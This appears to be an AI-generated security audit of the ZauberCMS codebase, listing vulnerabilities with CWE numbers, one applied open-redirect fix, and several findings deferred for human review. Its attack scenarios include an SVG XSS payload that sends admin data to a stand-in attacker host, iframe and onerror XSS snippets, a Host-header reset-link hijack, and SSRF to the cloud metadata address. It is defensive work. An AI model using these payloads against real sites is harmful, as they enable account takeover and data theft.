# Security Audit

_Generated: 2026-05-07 14:30 UTC_
_Build status after fixes: PASSED_

## Summary
| | Found | Fixed | Skipped |
|--|--|--|--|
| Critical | 0 | 0 | 0 |
| High | 5 | 1 | 4 |
| Medium | 6 | 0 | 6 |
| Low | 4 | 0 | 4 |

## Findings

### [HIGH] Open redirect on `/api/auth/logout` and `/api/auth/refreshsignin`
- **File:** `ZauberCMS.Components/Controllers/AuthController.cs:14-27` (pre-fix)
- **CWE:** CWE-601 (URL Redirection to Untrusted Site)
- **Confidence:** High
- **Status:** FIXED
- **Issue:** Both `RefreshSignIn` and `Logout` accepted a query-string `redirectUrl` parameter and passed it straight to `Redirect(...)` without verifying the target is local. `Redirect(string)` honours absolute URLs, so any external host could be supplied. Both endpoints are anonymous-accessible (no `[Authorize]`), so an attacker can craft phishing links that originate from the application's domain and bounce to attacker-controlled sites.
- **Attack scenario:** Attacker shares `https://victim-site/api/auth/logout?redirectUrl=https://attacker.example/login`. A logged-in user clicks → server signs them out, then issues a 302 to the attacker's lookalike login page. Because the URL bar momentarily showed the legitimate domain, the user is more likely to enter credentials on the lookalike. The same pattern works for `refreshsignin`. No authentication required to abuse, since both endpoints just return a redirect even if no user is signed in.
- **Why it matters:** Phishing pivot from the trusted domain. Also enables abuse in OAuth/SSO flows where a callback verifies origin against a redirect target.
- **Fix applied:** Replaced the unconditional `Redirect(redirectUrl ?? "/")` with a helper that only honours the supplied URL when `Url.IsLocalUrl(redirectUrl)` returns true; otherwise redirects to `/`. This is the standard ASP.NET Core mechanism for return-URL validation and matches the protection used by the framework's identity pages.
- **Notes:** The `MapPost("/Logout"...)` handler in `IdentityComponentsEndpointRouteBuilderExtensions.cs` already uses `TypedResults.LocalRedirect("~/{returnUrl}")` which is safe (LocalRedirect rejects protocol-relative and absolute URLs). The CSRF angle of allowing logout via GET (an attacker can include `<img src="/api/auth/logout">` to log users out involuntarily) is left in place — flag-only, since requiring POST changes the call sites.

### [HIGH] Host header injection in password-reset and email-confirmation links
- **File:** `ZauberCMS.Core/Extensions/HttpContextExtensions.cs:18-30`, callers `ZauberCMS.Core/Membership/Services/MembershipService.cs:901`, `ZauberCMS.Core/Email/Services/EmailService.cs:48`
- **CWE:** CWE-20 (Improper Input Validation), CWE-640 (Weak Password Recovery)
- **Confidence:** High
- **Status:** not fixed
- **Issue:** `ToAbsoluteUrl` builds the absolute callback URL (used in password-reset and email-confirmation emails) directly from `request.Host.Value`, the unvalidated incoming `Host` header. The repo's `appsettings.json` ships with `"AllowedHosts": "*"` so the framework's host filtering middleware does not reject crafted Host headers either.
- **Attack scenario:** Attacker sends `POST /Account/ForgotPassword` with body `Email=victim@example.com` and an HTTP `Host: attacker.example` header. The reset code is generated for the legitimate user, but the `callbackUrl` rendered into the email is `https://attacker.example/Account/ResetPassword?code=...&email=victim@example.com`. Victim clicks the link in their inbox → token is sent to attacker → attacker replays it on the real site to take over the account.
- **Why it matters:** Account takeover via password reset. Same primitive works against email-confirmation links to confirm an attacker-controlled email change if that flow is exposed.
- **Why not fixed:** The fix needs an architectural decision — either (a) pin the callback origin to a configured value (`Zauber:SiteUrl` or similar), (b) tighten `AllowedHosts` to a real allow-list and document it, or (c) validate `Host` against an explicit list before using it in identity emails. Touches identity flow and global config; flag for human review.

### [HIGH] SVG accepted in default `AllowedFileTypes`, served as same-origin static file
- **File:** `ZauberCMS.Core/Settings/GlobalSettings.cs:14`, `ZauberCMS.Core/Providers/DiskStorageProvider.cs:42-65`
- **CWE:** CWE-79 (Stored XSS), CWE-434 (Unrestricted Upload of File with Dangerous Type)
- **Confidence:** High
- **Status:** not fixed
- **Issue:** `.svg` is included in the default `AllowedFileTypes`. SVG is XML and can contain `<script>` blocks, `onload` handlers, `<foreignObject>` HTML, etc. The file is written under `wwwroot/{UploadFolderName}` and served by `UseStaticFiles` with `Content-Type: image/svg+xml` based on extension — browsers execute scripts inside SVGs served this way. There is no SVG sanitisation on save and no `Content-Disposition: attachment` override on serve. There is no magic-byte content-sniff either — the extension is the only check.
- **Attack scenario:** Authenticated user with media upload rights uploads `xss.svg` containing `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('/admin/api/...').then(r=>r.text()).then(t=>fetch('https://attacker/?d='+btoa(t)))"></svg>`. Victim (admin or another logged-in user) navigates to the image URL — script executes in the site's origin, exfiltrating cookies / antiforgery tokens / admin data. Also reachable via `<img src="/media/.../xss.svg">` embedded in another page if any rendering surface accepts arbitrary HTML.
- **Why it matters:** Stored XSS at the same origin as the admin UI. With Blazor's interactive admin running there, an attacker can pivot to admin actions (CSRF tokens are read by the script).
- **Why not fixed:** Removing `.svg` from defaults is a one-line change but a behaviour-breaking default for existing sites. The proper fix is one of: (a) drop SVG from the default allow-list, (b) sanitise SVG on save (would need a sanitiser library), or (c) serve SVG with `Content-Disposition: attachment` and a non-script MIME type. All three are design decisions; flag for human review.

### [HIGH] First-registered-user automatically becomes Admin
- **File:** `ZauberCMS.Core/Extensions/RoleExtensions.cs:30-36`
- **CWE:** CWE-269 (Improper Privilege Management)
- **Confidence:** High
- **Status:** not fixed
- **Issue:** `AssignStartingRoleAsync` grants the `Admin` role to the user when `dbContext.Users.Count() == 1` — i.e. whoever registers first. The `/Account/Register` page is open to anonymous users with no rate-limit on the "first user" promotion (the rate limiter is per-IP, not per-account-state). The same path is hit by external-login first-time sign-ups in `ZauberSignInManager.ExternalLoginSignInAsync`.
- **Attack scenario:** A site is deployed with the database freshly migrated but the legitimate operator has not yet registered. An attacker who can reach `/Account/Register` (which is anonymously accessible) registers any account and is promoted to Admin. With `SignInRequireConfirmedAccount=false` (the shipped default) they can log in immediately.
- **Why it matters:** Full admin takeover during the install window. Also abusable any time the user table is wiped without the operator immediately re-registering. Combined with the OAuth flow (next finding), an attacker who can reach an OAuth callback can also claim Admin without seeing a registration form.
- **Why not fixed:** Changing the bootstrap admin pattern is a design-level fix (e.g. require a setup token, require the first user's email to match `AdminEmailAddresses`, or require an explicit "claim admin" step from a console command). Touches identity flow, flag for human review.
- **Notes:** Documented as the install path in the README, so this is intentional — but not currently rate-limited or constrained. Operators should at minimum set `AdminEmailAddresses` before exposing the site.

### [HIGH] OAuth external login auto-creates accounts and trusts unverified `email` claim
- **File:** `ZauberCMS.Core/Membership/ZauberSignInManager.cs:42-110`, `ZauberCMS.Core/Membership/Services/MembershipService.cs:757-823`
- **CWE:** CWE-287 (Improper Authentication), CWE-345 (Insufficient Verification of Data Authenticity)
- **Confidence:** Medium
- **Status:** not fixed
- **Issue:** When an external login succeeds at the OAuth provider but no local mapping exists, the code calls `_userManager.CreateAsync(user)` with `Email = info.Principal.FindFirstValue(ClaimTypes.Email)` and no check that the OAuth provider has marked the email as verified. The created user has `EmailConfirmed=false` (default) but `RequireConfirmedAccount=false` is the default, so they sign in immediately. They are then run through `AssignStartingRoleAsync`, which can hand out Admin if the email matches `AdminEmailAddresses` or if the user table was empty.
- **Attack scenario:** Operator configures `AdminEmailAddresses=["admin@victim.example"]`. Attacker controls a Microsoft Entra tenant with an unverified domain or a Google Workspace where domain ownership is not enforced and registers `admin@victim.example`. Attacker clicks "Sign in with Microsoft/Google" on the victim site → provider returns a token with `email=admin@victim.example` → CMS creates a local user, assigns Admin (matching the configured admin email), and signs them in. Note: Google and Microsoft typically validate workspace domain ownership for paid tenants, but freemium tiers and self-serve flows have historically allowed unverified domain claims.
- **Why it matters:** Cross-IdP account takeover. Even where domain validation is strong, an attacker who registers an OAuth account with `email=victim@example.com` may collide with a local account created by `victim@example.com` and (depending on provider behaviour) end up signed in as them.
- **Why not fixed:** Fixing requires reading the provider's `email_verified` claim where present and rejecting unverified emails, and deciding policy for matching to existing local accounts (link vs reject). Touches identity flow; flag.

### [MEDIUM] Anonymous registration plus open admin promotion via `AdminEmailAddresses`
- **File:** `ZauberCMS.Core/Extensions/RoleExtensions.cs:31-36`, `ZauberCMS.Components/Account/Pages/Register.razor`
- **CWE:** CWE-269 (Improper Privilege Management)
- **Confidence:** High
- **Status:** not fixed
- **Issue:** Beyond the "first user" path, anyone whose email matches `GlobalSettings.AdminEmailAddresses` becomes Admin on registration with no confirmation step (when `SignInRequireConfirmedAccount=false`, the default). The list is editable by any admin via the UI, so once an attacker is admin they can preserve persistence by adding an attacker-controlled email.
- **Attack scenario:** Two phases. (1) Attacker registers with a configured admin email — automatically promoted to Admin as soon as they hit `/Account/Register`, no email confirmation required by default. (2) Once admin, the attacker adds their burner email to `AdminEmailAddresses`, so later credential rotation does not lock them out.
- **Why not fixed:** The "promote on email match" rule is a deliberate feature. Hardening it (require email confirmation, require an admin to invite, two-factor on first promotion) is a design choice; flag.

### [MEDIUM] Admin SSRF via SEO Checker / `BrokenLinksCheck`
- **File:** `ZauberCMS.Components/Seo/SeoChecker.razor:53-62`, `ZauberCMS.Core/Seo/Checks/ResponseStatusCheck.cs:23`, `ZauberCMS.Core/Seo/Checks/BrokenLinksCheck.cs:60-61`
- **CWE:** CWE-918 (SSRF)
- **Confidence:** High
- **Status:** not fixed
- **Issue:** The SEO checker takes a URL string from the admin UI (`<RadzenTextBox @bind-Value="@FullUrl" />`) and passes it to `HtmlAgilityPack.HtmlWeb.Load(FullUrl)` and `HttpClient.GetAsync(absoluteUrl)`. There is no scheme/host allowlist, no IP-range filter, and no block on `localhost`/RFC1918. The `BrokenLinksCheck` then walks every `<a href>` inside the fetched HTML and fetches each one too, multiplying the SSRF reach.
- **Attack scenario:** Admin (or anyone whose admin session is hijacked, e.g. via the SVG XSS finding) puts `http://169.254.169.254/latest/meta-data/iam/security-credentials/` into the SEO checker on a cloud-hosted instance. The server fetches the EC2/Azure/GCP metadata service and the response is rendered back into the admin UI (`SeoCheckResultItem.DefaultMessage`). Same primitive works against `http://localhost:5432/` to fingerprint internal services.
- **Why not fixed:** Building an allowlist / IP-block policy is non-trivial; the right defaults depend on whether the deployment expects to crawl arbitrary external URLs (which is the feature's stated purpose). Flag.

### [MEDIUM] Dynamic LINQ injection in admin DataGrid queries
- **File:** `ZauberCMS.Core/Content/Services/ContentService.cs:1457-1465`, `ZauberCMS.Components/Admin/ContentSection/ContentListView.razor:118-128`
- **CWE:** CWE-94 (Code Injection)
- **Confidence:** Medium
- **Status:** not fixed
- **Issue:** `query.Where(parameters.Filter)` and `query.OrderBy(parameters.Order)` use `System.Linq.Dynamic.Core`. The `Filter` and `Order` strings come from Radzen `LoadDataArgs.Filter` / `LoadDataArgs.OrderBy`, which originate in the browser and are not sanitised on the server. Dynamic LINQ supports method calls and property access; while it is constrained to the queryable model, history shows escapes (especially across versioned releases of `System.Linq.Dynamic.Core`).
- **Attack scenario:** Admin sends a forged data-grid request with a hand-crafted `Filter="x => CallSomeMethod()"`. The expression compiles against `IQueryable<Content>` and runs in the EF query pipeline. Even where the expression is pure-data, it can probe for properties that aren't normally queryable in the UI (e.g., navigation properties, internal flags), and craft predicates that exfiltrate data through cache key collisions.
- **Why not fixed:** This is admin-only, so the immediate attacker is already privileged. Hardening would be either (a) drop `Filter`/`Order` and use a typed sort enum, or (b) parse the strings server-side against a known-property allowlist. Both change the data-grid contract; flag.

### [MEDIUM] HTML sanitiser allows `<iframe>` and `data:` URIs
- **File:** `ZauberCMS.Core/Shared/Services/DefaultHtmlSanitizerService.cs:18-28`
- **CWE:** CWE-79 (XSS)
- **Confidence:** Medium
- **Status:** not fixed
- **Issue:** The default sanitiser explicitly allows `iframe` and `data:` URIs. `<iframe src="data:text/html,<script>...</script>">` is a classic XSS gadget; `<iframe src="https://attacker.example/csrf-bait">` enables clickjacking. There is no allowed-iframe-host list and no `sandbox` attribute enforcement.
- **Attack scenario:** An editor (Member-role user with content-edit privilege if any such role exists, or a compromised lower-privilege account) saves an RTE block containing `<iframe src="data:text/html,<script>fetch('/admin/users')...</script>"></iframe>`. Anyone visiting the front-end page renders the iframe in the same origin and the script runs.
- **Why not fixed:** Deciding whether iframes are a feature (TinyMCE oEmbed inserts use them for video) or a footgun is a product call. Tightening the sanitiser policy may break embeds users rely on. Flag.
- **Notes:** Crucially, in this repo there is no evidence the sanitiser is actually invoked on RTE save or render. The sample `RTEBlock.razor` in `ZauberCMS.Web/ContentBlocks/RTEBlock.razor` writes raw `Content.GetValue<string>("Text")` straight into a `MarkupString`. So the iframe issue is moot only because nobody is calling the sanitiser. See next finding.

### [MEDIUM] RTE content rendered without sanitisation in the shipped sample
- **File:** `ZauberCMS.Web/ContentBlocks/RTEBlock.razor:6`
- **CWE:** CWE-79 (Stored XSS)
- **Confidence:** High
- **Status:** not fixed
- **Issue:** The sample RTE content block does `@((MarkupString)(Content.GetValue<string>(PropertyName) ?? string.Empty))` — raw HTML straight from the editor's stored value, no sanitiser pass on either save or render. `IHtmlSanitizerService` is registered in DI but never injected/called here. Users who copy this pattern into their site templates inherit the same hole.
- **Attack scenario:** Attacker with editor privileges (or any role allowed to fill in an RTE field — the access model varies per content type) saves `<img src=x onerror="fetch('/admin/...')">` in the RTE field. Every front-end visitor who hits the page executes the script in the site's origin. If the visitor is an admin, the attack pivots to admin actions because the same origin owns the admin antiforgery token.
- **Why not fixed:** Lives in `ZauberCMS.Web` (the dev runner / sample). Editing the sample is fine but the underlying issue is policy: the framework should make sanitisation the default render path for RTE values rather than relying on consumers to remember. That's an API-design call. Flag.
- **Notes:** This sample is also the pattern shipped in `ZauberCMS.Template/template/ZauberCMSTemplate.Site/` (worth verifying explicitly — out-of-scope for this audit but adjacent).

### [MEDIUM] File-upload type check is by extension, no magic-byte / content-type validation
- **File:** `ZauberCMS.Core/Providers/DiskStorageProvider.cs:42-65`, `ZauberCMS.Core/Extensions/FileExtensions.cs:78-103`
- **CWE:** CWE-434 (Unrestricted Upload), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File)
- **Confidence:** Medium
- **Status:** not fixed
- **Issue:** `CanUseFile` checks only `Path.GetExtension(file.Name)` against `AllowedFileTypes`. There's no inspection of the actual bytes (magic numbers) and no enforcement of the browser-supplied Content-Type. The image-resize path also goes through `OverMaxSizeCheckAsync` only when `IsImage()` returns true — which itself is extension-based.
- **Attack scenario:** Mostly defence-in-depth — an attacker who can already pick the extension can upload whatever bytes they like. Direct exploitation requires another bug (e.g. a URL the attacker controls renders the file with a different MIME type). The bigger risk is polyglot files (e.g. an image that's also valid JS) used in attacks against caching or third-party tools that read the file by extension.
- **Why not fixed:** Adding magic-byte validation needs a small library (`MimeMapping` is in the BCL but not magic-byte-aware) or a bunch of hand-rolled signatures. Decision call; flag.

### [MEDIUM] Anonymous account-registration flooding / CAPTCHA absence
- **File:** `ZauberCMS.Components/Account/Pages/Register.razor`, `ZauberCMS.Core/Membership/Services/MembershipService.cs:673-749`
- **CWE:** CWE-799 (Improper Control of Interaction Frequency)
- **Confidence:** High
- **Status:** not fixed
- **Issue:** `/Account/Register` is rate-limited via `EnableRateLimiting("login")` at 10 hits per 5 minutes per source IP. There is no CAPTCHA, no email-verification gate before the account is fully created, and (with `SignInRequireConfirmedAccount=false`) auto-login. An attacker behind a botnet can create accounts at 10/IP/5min × N IPs. Each account triggers an email send.
- **Attack scenario:** Botnet hammers `/Account/Register` with the victim's email service as the SMTP egress, exhausting the SMTP send quota or filling the audit log / DB. Combined with the "first user becomes admin" finding, also a DoS-during-install vector.
- **Why not fixed:** Adding CAPTCHA is a new dependency / external service decision. Requiring email-confirmation-before-login is a default-flip that breaks existing flows. Flag.

### [LOW] Logout via GET enables CSRF-driven sign-out
- **File:** `ZauberCMS.Components/Controllers/AuthController.cs:22-27`
- **CWE:** CWE-352 (CSRF)
- **Confidence:** High
- **Status:** not fixed
- **Issue:** `[HttpGet("logout")]` performs a state change (`signInManager.SignOutAsync()`) on a GET request. Antiforgery tokens are not validated for GETs. Any third-party page can include `<img src="https://victim/api/auth/logout">` to log the user out involuntarily.
- **Attack scenario:** Attacker hosts a page that loads such an `img` tag. Victim browsing that page is silently logged out of the CMS. Low impact alone (no privilege escalation, no data exposure), but enables nuisance attacks and can interfere with multi-step admin workflows.
- **Why not fixed:** Changing the verb to POST changes call sites (the `SectionLayout.razor` admin IP-whitelist check uses `NavigationManager.NavigateTo("/api/auth/logout", true)` to log out the user, which is a GET). Flag.

### [LOW] MD5 used for usernames and gravatar-style claim
- **File:** `ZauberCMS.Core/Membership/ZauberSignInManager.cs:120`, `ZauberCMS.Core/Extensions/StringExtensions.cs:316`, `ZauberCMS.Core/Membership/Claims/ZauberUserClaimsPrincipalFactory.cs:24`
- **CWE:** CWE-327 (Use of a Broken Cryptographic Algorithm)
- **Confidence:** High
- **Status:** not fixed
- **Issue:** MD5 is used in two non-security-critical contexts: deriving a deterministic placeholder username from email, and computing a gravatar-style email hash claim. Neither is used for authentication, integrity, or confidentiality. Static analysis tools and FIPS-mode hosts will still flag it.
- **Attack scenario:** No realistic attack path; usernames must already be unique on creation, gravatar hashes are intentionally derivable from public emails.
- **Why not fixed:** Out of strict-fix scope (Low severity). Trivial swap to SHA-256 if desired.

### [LOW] `ShowDetailedErrors` toggle exposes stack traces when enabled
- **File:** `ZauberCMS.Core/ZauberSetup.cs:289-296`, `ZauberCMS.Core/Settings/ZauberSettings.cs:12`
- **CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
- **Confidence:** Medium
- **Status:** not fixed
- **Issue:** `ShowDetailedErrors=true` enables `DetailedErrors` on Razor / Interactive Server components and turns on `AddDatabaseDeveloperPageExceptionFilter` (which can leak DB schema / migration state on error pages). The default is `false`, but there is no guard preventing it being set in production `appsettings.json`. Common configuration footgun.
- **Why not fixed:** Out of strict-fix scope. Documentation/audit-time check.

### [LOW] `appsettings.json` ships SMTP credentials and OAuth secrets as inline placeholders
- **File:** `ZauberCMS.Web/appsettings.json:64-70`, `ZauberCMS/appsettings.json:64-70`
- **CWE:** CWE-256 (Plaintext Storage of a Password), CWE-798 (Use of Hard-coded Credentials)
- **Confidence:** Low
- **Status:** not fixed
- **Issue:** The shipped `appsettings.json` (both in the dev runner and the packaged defaults) has `Email.Smtp.Username/Password` and `Identity.ExternalProviders.*.ClientSecret` as empty-string placeholders. That's fine in the shipped file, but the deployment guidance does not consistently steer operators to user-secrets / env vars. Operators commonly fill the live values in directly and check them in.
- **Why not fixed:** Out of strict-fix scope; documentation issue. Worth flagging to the user.

## Surfaces reviewed

- Anonymous-reachable endpoints:
  - `/Account/Login`, `/Account/Register`, `/Account/ForgotPassword`, `/Account/ResetPassword`, `/Account/ConfirmEmail`, `/Account/ExternalLogin`
  - `MapPost("/Account/PerformExternalLogin")`, `MapPost("/Account/Logout")` (Identity additional endpoints)
  - `/api/auth/refreshsignin`, `/api/auth/logout` (custom AuthController)
  - Front-end catch-all (`CatchAll.razor` → `EntryPage.razor`)
  - Static media path (`/{UploadFolderName}/...`) gated by `RestrictedMediaMiddleware`
- Authenticated / admin-only:
  - `/admin/*` and `/Admin/*` Blazor pages (covered by `[Authorize(Roles="Admin")]` via `Admin/_Imports.razor`)
  - Media upload (`MultipleMediaUpload.razor`)
  - SEO checker (`SeoChecker.razor` → `BrokenLinksCheck.cs`, `ResponseStatusCheck.cs`)
  - Content / role / user services (membership, content, media, audit)
  - DataGrid Filter/Order pipe (Dynamic LINQ)
- Cross-cutting:
  - HTML sanitisation (`DefaultHtmlSanitizerService`) and its (lack of) call sites
  - `MarkupString` usages in Razor
  - Path traversal in `DiskStorageProvider` (verified safe via `TryResolveUnderWebRoot`)
  - Raw SQL surfaces (`FromSqlRaw` in `DbContextExtensions` — verified parameterised, table name is enum-bounded)
  - Identity options (`ZauberSetup.AddZauberCms`), cookie defaults, antiforgery wiring
  - Email-link generation (`HttpContextExtensions.ToAbsoluteUrl`)
  - Crypto primitives (MD5 / SHA-1 / `Random` searches)
  - External auth providers (Google / Facebook / Microsoft)
  - Rate limiting (`login` policy)
  - Redirect middleware (`RedirectMiddleware.cs`)
  - Restricted-media middleware (`RestrictedMediaMiddleware.cs`)

## Files modified

- `ZauberCMS.Components/Controllers/AuthController.cs` — replaced unconditional `Redirect(redirectUrl ?? "/")` with a `LocalRedirectOrHome` helper that gates on `Url.IsLocalUrl(...)` for both `/api/auth/refreshsignin` and `/api/auth/logout` to close the open-redirect.

## Areas you did not fully cover

- `BlockListEditor` save / change pipeline (`ProcessBlockListEditorChangesAsync` and friends): only spot-checked. The audit prompt for this surface is in `Docs/BlockListEditor.md`. Worth a focused pass since BlockList edits feed JSON into property values that may be rendered directly.
- TinyMCE / `ZauberCMS.RTE` content lifecycle: did not trace whether `purify.min.js` runs on save and whether server trusts client-side sanitisation only.
- Template package (`ZauberCMS.Template/template/ZauberCMSTemplate.Site/`): assumed parity with `ZauberCMS.Web` but did not enumerate.
- Plugin / extension discovery (`ExtensionManager.GetTypeFromName`, `CreateComponent`): not seeing user input feed it directly, but the code accepts a fully-qualified name and reflects, which is a class of risk worth a deeper trace.
- I18n / dictionary / language flow (`CultureMiddleware`, dictionary entries rendered in admin and front-end): not deeply audited for stored XSS.
- Dependency CVE pass: did not enumerate `dotnet list package --vulnerable` since the prompt asked not to over-flag dependency drift.
